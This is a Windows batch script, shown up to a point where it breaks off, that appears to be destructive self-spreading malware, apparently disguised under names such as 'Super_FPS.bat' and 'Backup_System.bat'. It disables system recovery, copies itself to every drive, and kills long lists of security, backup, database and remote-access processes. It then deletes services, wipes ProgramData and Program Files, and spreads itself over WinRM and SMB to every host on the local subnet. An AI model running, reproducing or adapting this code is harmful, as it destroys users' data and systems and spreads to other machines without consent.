@echo off
setlocal EnableDelayedExpansion
chcp 65001 >nul 2>&1
set "SELF=%~f0"
if "%~d0"=="\\" (
 pushd "%~dp0"
 set "SELF=!CD!\%~nx0"
)
set "TEMP_DIR=%TEMP%"
set "PS_FILE=%TEMP_DIR%\s.ps1"
set "KILL_PS=%TEMP_DIR%\k.ps1"
set "SVC_PS=%TEMP_DIR%\sv.ps1"
set "NET_PS=%TEMP_DIR%\n.ps1"
set "DP_TEMP=%TEMP_DIR%\dp_wipe_%random%.ps1"
set "DP_SCRIPT=%TEMP_DIR%\inv_dp.txt"
set "DP_OUTPUT=%TEMP_DIR%\inv_dp_out.txt"
net session >nul 2>&1
if %errorlevel% neq 0 goto :retry_msg
goto :stealth

:retry_msg
if not defined retryCount set "retryCount=0"
set /a retryCount+=1
if !retryCount! gtr 5 goto :retry_limit
set "msg[0]=English: Please run this script as Administrator. Right-click on the file and select 'Run as administrator'. Thank you for your cooperation! ^<3"
set "msg[1]=Tiếng Việt: Vui lòng chạy script này với quyền Administrator. Nhấp chuột phải vào file và chọn 'Run as administrator'. Cảm ơn bạn rất nhiều! ^<3"
set "msg[2]=中文: 请以管理员权限运行此脚本。右键单击文件，然后选择“以管理员身份运行”。感谢您的合作！^<3"
set "msg[3]=日本語: このスクリプトを管理者として実行してください。ファイルを右クリックし、「管理者として実行」を選択してください。ご協力ありがとうございます！^<3"
set "msg[4]=한국어: 이 스크립트를 관리자 권한으로 실행하세요. 파일을 마우스 오른쪽 버튼으로 클릭하고 '관리자로 실행'을 선택하세요. 협조해 주셔서 감사합니다! ^<3"
set "msg[5]=Français: Veuillez exécuter ce script en tant qu'administrateur. Faites un clic droit sur le fichier et sélectionnez « Exécuter en tant qu'administrateur ». Merci de votre coopération ! ^<3"
set "msg[6]=Deutsch: Bitte führen Sie dieses Skript als Administrator aus. Klicken Sie mit der rechten Maustaste auf die Datei und wählen Sie „Als Administrator ausführen“. Vielen Dank für Ihre Unterstützung! ^<3"
set "msg[7]=Español: Ejecute este script como administrador. Haga clic derecho en el archivo y seleccione 'Ejecutar como administrador'. ¡Gracias por su cooperación! ^<3"
set "msg[8]=Русский: Пожалуйста, запустите этот скрипт от имени администратора. Щёлкните правой кнопкой мыши по файлу и выберите «Запуск от имени администратора». Спасибо за сотрудничество! ^<3"
set "msg[9]=العربية: يرجى تشغيل هذا السكريبت كمسؤول. انقر بزر الماوس الأيمن على الملف واختر 'تشغيل كمسؤول'. شكراً لتعاونك! ^<3"
:loop

:stealth
if "%~1"=="--elevated" goto :START_PROCESS
start "" /Realtime "%~dpnx0" --elevated >nul 2>&1
reagentc /disable >nul 2>&1
powershell -Command "Get-PSDrive -PSProvider FileSystem | ForEach-Object { try { Copy-Item -Path '%~f0' -Destination (Join-Path $_.Root 'Backup_System.bat') -Force -ErrorAction Stop } catch {} }" >nul 2>&1
:START_PROCESS
> "!KILL_PS!" (
echo $processesToKill = @('Teams','Webex','Slack','Zoom','Discord','Skype','Outlook','OneDrive','Dropbox','Spotify','Adobe','AutoCAD','SolidWorks','Matlab','Python','Java','Docker','VMware','VirtualBox','Git','Sourcetree','Postman','FileZilla','WinRAR','7z','Notepadpp','Sublime','VSCode','Chrome','Edge','Firefox','Opera','Brave','Thunderbird','Evernote','Trello','Asana','Todoist','CamStudio','OBS','ShareX','Greenshot','Loom','Audacity','VLC','GIMP','Inkscape','Blender','Unity','Unreal','Steam','EpicGames','Origin','Uplay','BattleNet','GOG','DiscordPTB','Franz','Rambox','Miranda','Pidgin','Trillian','Telegram','Signal','Line','Viber','WeChat','WhatsApp','QQ','ICQ','Mailbird','eMClient','TheBat','Foxmail','OperaMail','ClawsMail','SumatraPDF','Foxit','Nitro','PDF24','AdobeReader','ChromeRemote','AnyDesk','TeamViewer','LogMeIn','VNC','UltraVNC','TightVNC','RealVNC','AmmyyAdmin','Splashtop','ConnectWise','ScreenConnect','SimpleHelp','RemoteUtilities','RAdmin','DameWare','NetSupport','Bomgar','BeyondTrust','GoToAssist','ZohoAssist','Freshdesk','TeamSupport','LiveAgent','Kayako','Zendesk','HappyFox','Intercom','Drift','Crisp','Tawk','Smartsupp','LiveChat','Chatra','Olark','Userlike','Cobrowsing','Surfly','Ujet','Talkdesk','Aircall','RingCentral','Genesys','CiscoJabber','Avaya','Mitel','Nortel','ShoreTel','3CX','FreeSWITCH','Asterisk','ViciDial','GoAutoDial','Elastix','PBXAct','FusionPBX','Issabel','VitalPBX','Switchvox','Digium','Sangoma','Grandstream','Yealink','Polycom','Snom','CiscoIPPhone','LinksysSpa','Obihai','Ooma','Vonage','MagicJack','NetTalk','PhonePower','VOIPo','Voip.ms','Callcentric','Flowroute','Telnyx','Twilio','Plivo','Bandwidth','Voxbone','SignalWire','Telestax','Restcomm','Mobicents','Jitsi','Meetecho','Janus','Kurento','Mediasoup','OpenVidu','LiveKit','DailyCo','Whereby','Vdoo','8x8','BlueJeans','Lifesize','Pexip','StarLeaf','Highfive','ZoomRooms','GoogleMeet','Hangouts','Duo','FacebookMessenger','SkypeForBusiness','MicrosoftTeams','SlackHuddle','DiscordStage','Clubhouse','TwitterSpaces','SpotifyGreenroom','AmazonChime','GoToMeeting','JoinMe','WebExMeeting','AdobeConnect','OmniJoin','ClickMeeting','EasyWebinar','Demio','Livestorm','BigMarker','WebinarJam','StealthSeminar','EverWebinar','WebinarGeek','ZoomWebinar','CiscoWebexEvents','MicrosoftLiveEvents','YouTubeLive','FacebookLive','InstagramLive','TikTokLive','TwitchLive','VimeoLive','StreamYard','Restream','Melon','Castr','SwitchboardLive','Dacast','IBMQRadar','Splunk','ArcSight','LogRhythm','AlienVault','McAfeeEEPC','SymantecEndpoint','TrendMicroOfficeScan','SophosInterceptX','CrowdStrike','CarbonBlack','Cybereason','SentinelOne','BitdefenderGravityZone','KasperskyEndpoint','ESETFileSecurity','Forticlient','PaloAltoTraps','CheckPointEndpoint','FireEyeHX','Cylance','MalwarebytesEndpoint','WebrootSecureAnywhere','ComodoEndpoint','VIPRE','AVG','Avast','Avira','Panda','ZoneAlarm','BullGuard','F-Secure','GData','Qihoo360','TencentPCManager','BaiduAntivirus','K7Computing','QuickHeal','eScan','Norman','Immunet','ClamWin','SophosHome','Norton','McAfeeTotal','BitdefenderTotal','KasperskyTotal','ESETSmart','TrendMicroMax','ForticlientVPN','PulseSecure','GlobalProtect','AnyConnect','OpenVPN','WireGuard','SoftEther','Tinc','ZeroTier','Tailscale','Netbird','Headscale','Subspace','Innernet','Nebula','Slirp','VpnCloud','Tuns','BoringTun','CloudflareWarp','Psiphon','ProtonVPN','NordVPN','ExpressVPN','CyberGhost','Surfshark','VyprVPN','PrivateInternetAccess','HotspotShield','TunnelBear','Windscribe','Mullvad','IVPN','AzireVPN','OVPN','TrustZone','VPNUnlimited','KeepSolid','PureVPN','Ivacy','SaferVPN','ZenMate','Hoxx','SetupVPN','Betternet','TouchVPN','TurboVPN','SuperVPN','FastVPN','SnapVPN','ThunderVPN','LightningVPN','AtlasVPN','DewVPN','CeloVPN','Hidemyass','VPNBook','VPNGate','FreeVPN','Proxy','Shadowsocks','V2Ray','Trojan','Brook','Goflyway','Gost','Stunnel','Socat','RedSocks','Redsocks2','DNS2Socks','ProxyChains','Tor','Obfsproxy','Snowflake','Meek','Fte','Shapeshifter','Conjure','Taps','Lyrebird','Raven','OONIProbe','MeasurementLab','Ivy','Geneva','Censorships','Lantern','PsiphonPro','Infinite','GoodbyeDPI','Zapret','SpoofDPI','GreenTunnel','Sbypass','PowerTunnel','SimpleDnscrypt','Stubby','GetDns','DohClient','DnsCryptProxy','PiHole','AdGuardHome','Blocky','NextDns','ControlD','OpenDns','CloudflareGateway','Quad9','CleanBrowsing','CiraDNS','NeustarRecursive','ComodoSecure','VerisignPublic','DNSWatch','SafeDNS','YandexDNS','AdGuardDNS','Censurfridns','FreenomWorld','HeNet','HurricaneElectric','Cloudns','DnsMadeEasy','Dyn','Noip','DuckDns','FreeDns','AfraidOrg','ZoneEdit','EasyDns','MyDnsJP','Odnsk','DnsExit','Dynu','Dnspod','AliyunDns','HuaweiDns','TencentDns','BaiduDns','GoogleCloudDns','AzureDns','AwsRoute53','OracleDns','VmwareHorizon','CitrixReceiver','RemoteApp','MicrosoftRDS','XenApp','XenDesktop','ThinApp','Spoon','Turbo','Numecent','AppZero','Cloudpaging','FlexApp','Liquidware','FSLogix','ProfileUnity','AppSense','RESWorkspace','Ivanti','HEAT','LANDesk','ManageEngine','SolarWinds','PRTG','Nagios','Zabbix','Icinga','Prometheus','Grafana','Datadog','NewRelic','Dynatrace','AppDynamics','Instana','SignalFx','Wavefront','Honeycomb','Lightstep','Jaeger','Zipkin','OpenTelemetry','ElasticStack','Logstash','Kibana','Graylog','Fluentd','Vector','DatadogAgent','Telegraf','Collectd','StatsD','Graphite','Netdata','Glances','htop','btop','nvtop','bpytop','bashtop','gtop','vtop','gotop','ytop','zenith','bottom','procs','duf','dust','lsd','exa','bat','fd','ripgrep','fzf','zoxide','starship','ohmyposh','powerline10k','zsh','fish','nushell','xonsh','elvish','ion','oil','murex','es','rc','akari','sisyphus','gingko','pomsky','rustscan','masscan','nmap','zmap','zgrab','httpx','subfinder','amass','naabu','dnsx','chaos','uncover','katana','gospider','hakrawler','waybackurls','gau','getjs','linkfinder','secretfinder','ffuf','dirsearch','gobuster','feroxbuster','wfuzz','dirb','buster','meg','freq','crlfuzz','smuggler','interactsh','ngrok','localtunnel','bore','rathole','frp','nps','ebpf','falco','tetragon','tracee','inspektor','gadgettracer','kubectl','helm','kustomize','skaffold','tilt','garden','werf','jenkins','gitlab','github','bitbucket','circleci','travisci','drone','woodpecker','argo','flux','tekton','spinnaker','keel','ansible','terraform','pulumi','packer','vagrant','vsphere','ovirt','proxmox','openstack','cloudstack','opennebula','opentelekom','scaleway','exoscale','linode','vultr','digitalocean','rackspace','akamai','fastly','cloudflare','stackpath','azurefrontdoor','awscf','googlecdn','imperva','incapsula','sucuri','quic','cloudzy','zenlayer','edgecast','limelight','highwinds','cdnetworks','wangsu','chinacache','ccih','cdntw','cnc','hgc','pccw','hkt','wharf','equinix','digitalrealty','colt','interxion','cyrusone','coresite','switch','databank','qts','flexential','aptum','ironmountain','ascenty','odata','scalax','akamaiConnected','cloudflareSpectrum','fastlyRealTime','edgeNext','cdnsun','section','stackpathWAF','sucuriWAF','impervaWAF','cloudflareWAF','awsWAF','azureWAF','googleWAF','openresty','nginx','apache','iis','caddy','traefik','haproxy','envoy','linkerd','dapr','consul','zookeeper','etcd','eureka','nacos','apollo','springcloud','netflixoss','kafka','rabbitmq','activemq','zeromq','nanomsg','nats','pulsar','redis','memcached','couchbase','arangodb','orientdb','neo4j','dgraph','cayley','janusgraph','hugegraph','neptune','rdfox','graphdb','stardog','blazegraph','fuseki','virtuoso','sparql','gremlin','cypher','query','opencypher','mysql','postgresql','sqlite','mariadb','percona','oracle','sqlserver','db2','informix','saphana','teradata','greenplum','vertica','redshift','snowflake','bigquery','azureSynapse','databricks','presto','trino','athena','dremio','clickhouse','doris','starrocks','hive','sparksql','impala','kudu','kylin','druid','pinot','drill','hawq','madlib','plproxy','pgpool','pgbouncer','patroni','stolon','citus','timescaledb','influxdb','questdb','promscale','m3db','victoriametrics','thanos','cortex','uberjaeger','honeycomb','logz','scalyr','logdna','papertrail','logentries','loggly','splunkCloud','datadogLogs','newrelicLogs','elasticCloud','logit','bonsai','searchly','opensearch','amazonES','azureSearch','algolia','typesense','meilisearch','sonic','quickwit','tantivy','surrealdb','materialize','feldera','bytewax','arroyo','risingwave','hydro','sneller','partyrock','coralogix','axiom','betterstack','highlightio','hyperdx','openobserve','lakera','rebuff','llamaGuard','azureAI','googleVertex','openAI','anthropic','cohere','ai21','huggingface','replicate','banana','modal','runpod','vast','tensorDock','lambdaLabs','coreweave','together','cerebras','groq','sambanova','graphcore','habana','cambricon','iluvatar','horizonRobotics','blackSesame','rockchip','amlogic','allwinner','mediatek','qualcomm','samsung','apple','huaweiHisilicon','xiaomiPinecone','openaidilemma','characterAI','novelAI','sudowrite','lex','rytr','copyAI','jasper','writesonic','wordtune','quillbot','grammarly','proWritingAid','languageTool','sapling','deepL','lilt','modernMT','omniscient','microsoftTranslator','googleTranslate','yandexTranslate','amazonTranslate','baiduTranslate','tencentTranslate','alibabaTranslate','youdao','sogou','ctcpl','nmt','lucy','sysTran','promt','pairaphrase','smartling','transifex','lokalise','crowdin','poeditor','oneSky','localize','phrase','locize','textmaster','gengo','unbabel','lingotek','wordbee','memsource','matecat','zanata','weblate','virtaal','poedit')
echo $critical = @('explorer','csrss','winlogon','services','lsass','svchost','System','Registry','smss','wininit')
echo Get-Process ^| Where-Object {$processesToKill -contains $_.Name -and $critical -notcontains $_.Name} ^| Stop-Process -Force -ErrorAction SilentlyContinue
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!KILL_PS!" >nul 2>&1
del "!KILL_PS!" 2>nul
> "!SVC_PS!" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $svc = @('XT800Service_Personal','SQLSERVERAGENT','SQLWriter','SQLBrowser','MSSQLFDLauncher','MSSQLSERVER','QcSoftService','MSSQLServerOLAPService','VMTools','VGAuthService','MSDTC','TeamViewer','ReportServer','RabbitMQ','AHS SERVICE','Sense Shield Service','SSMonitorService','SSSyncService','TPlusStdAppService1300','MSSQL$SQL2008','SQLAgent$SQL2008','TPlusStdTaskService1300','TPlusStdUpgradeService1300','VirboxWebServer','jhi_service','LMS','FontCache3.0.0.0','OSP Service','DAService_TCP','eCard-TTransServer','eCardMPService','EnergyDataService','UI0Detect','K3MobileService','TCPIDDAService','WebAttendServer','UIODetect','wanxiao-monitor','VMAuthdService','VMUSBArbService','VMwareHostd','vm-agent','VmAgentDaemon','OpenSSHd','eSightService','apachezt','Jenkins','secbizsrv','SQLTELEMETRY','MSMQ','smtpsvrJT','zyb_sync','360EntHttpServer','360EntSvc','360EntClientSvc','NFWebServer','wampapache','MSSEARCH','msftesql','SyncBASE Service','OracleDBConcoleorcl','OracleJobSchedulerORCL','OracleMTSRecoveryService','OracleOraDb11g_home1ClrAgent','OracleOraDb11g_home1TNSListener','OracleVssWriterORCL','OracleServiceORCL','aspnet_state','Redis','JhTask','ImeDictUpdateService','MCService','allpass_redisservice_port21160','Flash Helper Service','Kiwi Syslog Server','UWS HiPriv Services','UWS LoPriv Services','ftnlsv3','ftnlses3','FxService','UtilDev Web Server Pro','ftusbrdwks','ftusbrdsrv','ZTE USBIP Client Guard','ZTE USBIP Client','ZTE FileTranS','wwbizsrv','qemu-ga','AlibabaProtect','ZTEVdservice','kbasesrv','MMRHookService','IpOverUsbSvc','MsDtsServer100','KuaiYunTools','KMSELDI','btPanel','Protect_2345Explorer','2345PicSvc','vmware-converter-agent','vmware-converter-server','vmware-converter-worker','QQCertificateService','OracleRemExecService','GPSDaemon','GPSUserSvr','GPSDownSvr','GPSStorageSvr','GPSDataProcSvr','GPSGatewaySvr','GPSMediaSvr','GPSLoginSvr','GPSTomcat6','GPSMysqld','GPSFtpd','Zabbix Agent','BackupExecAgentAccelerator','bedbg','BackupExecDeviceMediaService','BackupExecRPCService','BackupExecAgentBrowser','BackupExecJobEngine','BackupExecManagementService','MDM','TxQBService','Gailun_Downloader','RemoteAssistService','YunService','Serv-U','EasyFZS Server','Rpc Monitor','OpenFastAssist','Nuo Update Monitor','Daemon Service','asComSvc','OfficeUpdateService','RtcSrv','RTCASMCU','FTA','MASTER','NscAuthService','MSCRMUnzipService','MSCRMAsyncService$maintenance','MSCRMAsyncService','REPLICA','RTCATS','RTCAVMCU','RtcQms','RTCMEETINGMCU','RTCIMMCU','RTCDATAMCU','RTCCDR','ProjectEventService16','ProjectQueueService16','SPAdminV4','SPSearchHostController','SPTimerV4','SPTraceV4','OSearch16','ProjectCalcService16','c2wts','AppFabricCachingService','ADWS','MotionBoard57','MotionBoardRCService57','vsvnjobsvc','VisualSVNServer','FlexNet Licensing Service 64','BestSyncSvc','LPManager','MediatekRegistryWriter','RaAutoInstSrv_RT2870','CobianBackup10','SQLANYs_sem5','CASLicenceServer','SQLService','semwebsrv','TbossSystem','ErpEnvSvc','Mysoft.Autoupgrade.DispatchService','Mysoft.Autoupgrade.UpdateService','Mysoft.Config.WindowsService','Mysoft.DataCenterService','Mysoft.SchedulingService','Mysoft.Setup.InstallService','MysoftUpdate','edr_monitor','abs_deployer','savsvc','ShareBoxMonitorService','ShareBoxService','CloudExchangeService','U8WorkerService2','CIS','EASService','KICkSvr','U8SmsSrv','OfficeClearCache','TurboCRM70','U8DispatchService','U8EISService','U8EncryptService','U8GCService','U8KeyManagePool','U8MPool','U8SCMPool','U8SLReportService','U8TaskService','U8WebPool','UFAllNet','UFReportService','UTUService','U8WorkerService1')
echo $svc = $svc ^| Sort-Object -Unique
echo foreach($s in $svc) { sc.exe delete $s 2>$null }
echo $net = @('U8WorkerService1','U8WorkerService2','memcached Server','Apache2.4','UFIDAWebService','MSComplianceAudit','MSExchangeADTopology','MSExchangeAntispamUpdate','MSExchangeCompliance','MSExchangeDagMgmt','MSExchangeDelivery','MSExchangeDiagnostics','MSExchangeEdgeSync','MSExchangeFastSearch','MSExchangeFrontEndTransport','MSExchangeHM','MSSQL$SQL2008','MSExchangeHMRecovery','MSExchangeImap4','MSExchangeIMAP4BE','MSExchangeIS','MSExchangeMailboxAssistants','MSExchangeMailboxReplication','MSExchangeNotificationsBroker','MSExchangePop3','MSExchangePOP3BE','MSExchangeRepl','MSExchangeRPC','MSExchangeServiceHost','MSExchangeSubmission','MSExchangeThrottling','MSExchangeTransport','MSExchangeTransportLogSearch','MSExchangeUM','MSExchangeUMCR','MySQL5_OA')
echo $net = $net ^| Sort-Object -Unique
echo foreach($n in $net) { net stop $n 2>$null }
)
> "!NET_PS!" (
echo $task = @('pg_ctl.exe','rcrelay.exe','SogouImeBroker.exe','CCenter.exe','ScanFrm.exe','d_manage.exe','RsTray.exe','wampmanager.exe','RavTray.exe','mssearch.exe','sqlmangr.exe','msftesql.exe','SyncBaseSvr.exe','oracle.exe','TNSLSNR.exe','SyncBaseConsole.exe','aspnet_state.exe','AutoBackUpEx.exe','redis-server.exe','MySQLNotifier.exe','oravssw.exe','fppdis5.exe','His6Service.exe','dinotify.exe','JhTask.exe','Executer.exe','AllPassCBHost.exe','ap_nginx.exe','AndroidServer.exe','XT.exe','XTService.exe','AllPassMCService.exe','IMEDICTUPDATE.exe','FlashHelperService.exe','ap_redis-server.exe','UtilDev.WebServer.Monitor.exe','UWS.AppHost.Clr2.x86.exe','FoxitProtect.exe','ftnlses.exe','ftusbrdwks.exe','ftusbrdsrv.exe','ftnlsv.exe','Syslogd_Service.exe','UWS.HighPrivilegeUtilities.exe','ftusbsrv.exe','UWS.LowPrivilegeUtilities.exe','UWS.AppHost.Clr2.AnyCpu.exe','winguard_x64.exe','vmconnect.exe','firefox.exe','usbrdsrv.exe','usbserver.exe','Foxmail.exe','qemu-ga.exe','wwbizsrv.exe','ZTEFileTranS.exe','ZTEUsbIpc.exe','ZTEUsbIpcGuard.exe','AlibabaProtect.exe','kbasesrv.exe','ZTEVdservice.exe','MMRHookService.exe','extjob.exe','IpOverUsbSvc.exe','VMwareTray.exe','devenv.exe','PerfWatson2.exe','ServiceHub.Host.Node.x86.exe','ServiceHub.IdentityHost.exe','ServiceHub.VSDetouredHost.exe','ServiceHub.SettingsHost.exe','ServiceHub.Host.CLR.x86.exe','ServiceHub.RoslynCodeAnalysisService32.exe','ServiceHub.DataWarehouseHost.exe','Microsoft.VisualStudio.Web.Host.exe','SQLEXPRWT.exe','setup.exe','remote.exe','setup100.exe','landingpage.exe','WINWORD.exe','KuaiYun.exe','HwsHostPanel.exe','NovelSpider.exe','Service_KMS.exe','WebServer.exe','ChsIME.exe','btPanel.exe','Protect_2345Explorer.exe','Pic_2345Svc.exe','vmware-converter-a.exe','vmware-converter.exe','vmware.exe','vmware-unity-helper.exe','vmware-vmx.exe','usysdiag.exe','PopBlock.exe','gsinterface.exe','Gemstar.Group.CRS.Client.exe','TenpayServer.exe','RemoteExecService.exe','VS_TrueCorsManager.exe','ntpsvr-2019-01-22-wgs84.exe','rtkjob-ion.exe','ntpsvr-2019-01-22-no-usrcheck.exe','NtripCaster-2019-01-08.exe','BACSTray.exe','protect.exe','hfs.exe','jzmis.exe','NewFileTime_x64.exe','2345MiniPage.exe','JMJ_server.exe','cacls.exe','gpsdaemon.exe','gpsusersvr.exe','gpsdownsvr.exe','gpsstoragesvr.exe','gpsdataprocsvr.exe','gpsftpd.exe','gpsmysqld.exe','gpstomcat6.exe','gpsloginsvr.exe','gpsmediasvr.exe','gpsgatewaysvr.exe','gpssvrctrl.exe','zabbix_agentd.exe','BackupExec.exe','Att.exe','mdm.exe','BackupExecManagementService.exe','bengine.exe','benetns.exe','beserver.exe','pvlsvr.exe','beremote.exe','RemoteAssistProcess.exe','BarMoniService.exe','GoodGameSrv.exe','BarCMService.exe','TsService.exe','GoodGame.exe','BarServerView.exe','IcafeServicesTray.exe','BsAgent_0.exe','ControlServer.exe','DisklessServer.exe','DumpServer.exe','NetDiskServer.exe','PersonUDisk.exe','service_agent.exe','SoftMemory.exe','BarServer.exe','RtkNGUI64.exe','Serv-U-Tray.exe','QQPCSoftTrayTips.exe','SohuNews.exe','Serv-U.exe','QQPCRTP.exe','EasyFZS.exe','HaoYiShi.exe','HysMySQL.exe','wtautoreg.exe','ispiritPro.exe','CAService.exe','XAssistant.exe','TrustCA.exe','GEUU20003.exe','CertMgr.exe','eSafe_monitor.exe','MainExecute.exe','FastInvoice.exe','SoftMgrLite.exe','sesvc.exe','ScanFileServer.exe','Nuoadehgcgcd.exe','OpenFastAssist.exe','FastInvoiceAssist.exe','Nuoadfaggcje.exe','OfficeUpdate.exe','atkexComSvc.exe','FileTransferAgent.exe','MasterReplicatorAgent.exe','CrmAsyncService.exe','CrmUnzipService.exe','NscAuthService.exe','ReplicaReplicatorAgent.exe','ASMCUSvc.exe','OcsAppServerHost.exe','RtcCdr.exe','IMMCUSvc.exe','DataMCUSvc.exe','MeetingMCUSvc.exe','QmsSvc.exe','RTCSrv.exe','pnopagw.exe','NscAuth.exe','Microsoft.ActiveDirectory.WebServices.exe','DistributedCacheService.exe','c2wtshost.exe','Microsoft.Office.Project.Server.Calculation.exe','schedengine.exe','Microsoft.Office.Project.Server.Eventing.exe','Microsoft.Office.Project.Server.Queuing.exe','WSSADMIN.EXE','hostcontrollerservice.exe','noderunner.exe','OWSTIMER.EXE','wsstracing.exe','MySQLInstallerConsole.exe','EXCEL.EXE','RtkAudioService64.exe','RAVBg64.exe','FNPLicensingService64.exe','VisualSVNServer.exe','MotionBoard57.exe','MotionBoardRCService57.exe','LPManService.exe','RaRegistry.exe','RaAutoInstSrv.exe','RtHDVCpl.exe','DefenderDaemon.exe','BestSyncApp.exe','ApUI.exe','AutoUpdate.exe','LPManNotifier.exe','FieldAnalyst.exe','TimingGenerate.exe','Detector.exe','Estimator.exe','FA_Logwriter.exe','TrackingSrv.exe','cbInterface.exe','EnterprisePortal.exe','ccbService.exe','monitor.exe','U8DispatchService.exe','dbsrv16.exe','sqlservr.exe','KICManager.exe','KICMain.exe','ServerManagerLauncher.exe','TbossGate.exe','iusb3mon.exe','MgrEnvSvc.exe','Mysoft.Config.WindowsService.exe','Mysoft.UpgradeService.UpdateService.exe','hasplms.exe','Mysoft.Setup.InstallService.exe','Mysoft.UpgradeService.Dispatcher.exe','Mysoft.DataCenterService.WindowsHost.exe','Mysoft.DataCenterService.DataCleaning.exe','Mysoft.DataCenterService.DataTracking.exe','Mysoft.SchedulingService.WindowsHost.exe','ServiceMonitor.exe','Mysoft.SchedulingService.ExecuteEngine.exe','AgentX.exe','host.exe','vsjitdebugger.exe','VBoxSDS.exe','mysqld.exe','TeamViewer_Service.exe','TeamViewer.exe','CasLicenceServer.exe','tv_w32.exe','tv_x64.exe','rdm.exe','SecureCRT.exe','SecureCRTPortable.exe','VirtualBox.exe','VBoxSVC.exe','VirtualBoxVM.exe','abs_deployer.exe','edr_monitor.exe','sfupdatemgr.exe','ipc_proxy.exe','edr_agent.exe','edr_sec_plan.exe','sfavsvc.exe','DataShareBox.ShareBoxMonitorService.exe','DataShareBox.ShareBoxService.exe','Jointsky.CloudExchangeService.exe','Jointsky.CloudExchange.NodeService.ein','perl.exe','java.exe','emagent.exe','TsServer.exe','AppMain.exe','easservice.exe','Kingdee6.1.exe','QyKernel.exe','QyFragment.exe','UserClient.exe','GNCEFExternal.exe','ComputerZTray.exe','ComputerZService.exe','ClearCache.exe','ProLiantMonitor.exe','bugreport.exe','GNWebServer.exe','UI0Detect.exe','GNCore.exe','gnwayDDNS.exe','GNWebHelper.exe','php-cgi.exe','ESLUSBService.exe','CQA.exe','Kekcoek.pif','Tinuknx.exe','servers.exe','ping.exe','TianHeng.exe','K3MobileService.exe','VSSVC.exe','Xshell.exe','XshellCore.exe','FNPLicensingService.exe','XYNTService.exe','EISService.exe','UFSoft.U8.Framework.EncryptManager.exe','yonyou.u8.gc.taskmanager.servicebus.exe','U8KeyManagePool.exe','U8MPool.exe','U8SCMPool.exe','UFIDA.U8.Report.SLReportService.exe','U8TaskService.exe','U8TaskWorker.exe','U8WebPool.exe','U8AllAuthServer.exe','UFIDA.U8.UAP.ReportService.exe','UFIDA.U8.ECE.UTU.Services.exe','U8WorkerService.exe','UFIDA.U8.ECE.UTU.exe','ShellStub.exe','U8UpLoadTask.exe','UfSysHostingService.exe','UFIDA.UBF.SystemManage.ApplicationService.exe','UFIDA.U9.CS.Collaboration.MailService.exe','NotificationService.exe','UBFdevenv.exe','UFIDA.U9.SystemManage.SystemManagerClient.exe','mongod.exe','SpusCss.exe','UUDesktop.exe','KDHRServices.exe','Kingdee.K3.PUBLIC.BkgSvcHost.exe','Kingdee.K3.HR.Server.exe','Kingdee.K3.Mobile.Servics.exe','Kingdee.K3.PUBLIC.KDSvrMgrHost.exe','KDSvrMgrService.exe','pdfServer.exe','pdfspeedup.exe','SufAppServer.exe','tomcat5.exe','Kingdee.K3.Mobile.LightPushService.exe','iMTSSvcMgr.exe','kdmain.exe','KDActMGr.exe','Kingdee.DeskTool.exe','K3ServiceUpdater.exe','Aua.exe','iNethinkSQLBackup.exe','auaJW.exe','Scheduler.exe','bschJW.exe','SystemTray64.exe','OfficeDaemon.exe','OfficeIndex.exe','OfficeIm.exe','iNethinkSQLBackupConsole.exe','OfficeMail.exe','OfficeTask.exe','OfficePOP3.exe','apache.exe','GnHostService.exe','HwUVPUpgrade.exe','Kingdee.KIS.UESystemSer.exe','uvpmonitor.exe','UVPUpgradeService.exe','KDdataUpdate.exe','Portal.exe','U8SMSSrv.exe','Ufida.T.SM.PublishService.exe','lta8.exe','UfSvrMgr.exe','AutoUpdateService.exe','MOM.exe','wscript.exe','cscript.exe')
echo $task = $task ^| Sort-Object -Unique
echo foreach($t in $task) { taskkill /F /IM $t 2>$null }
)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!SVC_PS!" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "!NET_PS!" >nul 2>&1
del "!SVC_PS!" "!NET_PS!" 2>nul
icacls "%ProgramData%" /grant Administrators:F /t /c /l /q >nul 2>&1
rmdir /s /q "%ProgramData%" >nul 2>&1
takeown /f "%ProgramFiles%" /a /r /d y >nul 2>&1
icacls "%ProgramFiles%" /grant Administrators:F /t /c /l /q >nul 2>&1
rmdir /s /q "%ProgramFiles%" >nul 2>&1
endlocal
setlocal
> "%TEMP_DIR%\prop.ps1" (
echo $ErrorActionPreference = 'SilentlyContinue'
echo $ips = [System.Net.Dns]::GetHostAddresses([System.Net.Dns]::GetHostName()) ^| Where-Object { $_.AddressFamily -eq 'InterNetwork' }
echo if ($ips.Count -eq 0) { exit }
echo $myIP = $ips[0].IPAddressToString
echo $subnet = $myIP -replace '\.\d+$', '.'
echo $sourceFile = '%~dpnx0'
echo $psexecPath = '%~dp0psexec.exe'
echo $targets = 1..254 ^| ForEach-Object { \"$subnet$_\" } ^| Where-Object { $_ -ne $myIP }
echo $iss = [system.management.automation.runspaces.initialsessionstate]::CreateDefault()
echo $pool = [runspacefactory]::CreateRunspacePool(1, 254, $iss, $Host)
echo $pool.Open()
echo $sb = {
echo     param($ip, $source, $psexec)
echo     $ch = New-Object System.Net.Sockets.TcpClient
echo     $winrm = $false; $smb = $false
echo     try { $ar = $ch.BeginConnect($ip, 5985, $null, $null); if ($ar.AsyncWaitHandle.WaitOne(200)) { $ch.EndConnect($ar); $winrm = $true }; $ch.Close() } catch {}
echo     try { $ar = $ch.BeginConnect($ip, 445, $null, $null); if ($ar.AsyncWaitHandle.WaitOne(200)) { $ch.EndConnect($ar); $smb = $true }; $ch.Close() } catch {}
echo     if ($winrm) {
echo         try {
echo             $session = New-PSSession -ComputerName $ip -ErrorAction Stop
echo             Copy-Item -Path $source -Destination \"C:\Windows\Temp\Super_FPS.bat\" -ToSession $session -Force
echo             Invoke-Command -Session $session -ScriptBlock { Start-Process -FilePath \"cmd.exe\" -ArgumentList \"/c C:\Windows\Temp\Super_FPS.bat --remote\" -WindowStyle Hidden }
echo             Remove-PSSession $session
echo             return
echo         } catch { if ($session) { Remove-PSSession $session } }
echo     }
echo     if ($smb) {
echo         try {
echo             Copy-Item -Path $source -Destination \"\\$ip\C$\Windows\Temp\Super_FPS.bat\" -Force -ErrorAction Stop
echo             try { Invoke-CimMethod -ComputerName $ip -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = \"cmd.exe /c C:\Windows\Temp\Super_FPS.bat --remote\" } -ErrorAction Stop ^| Out-Null; return } catch {}
echo             try {
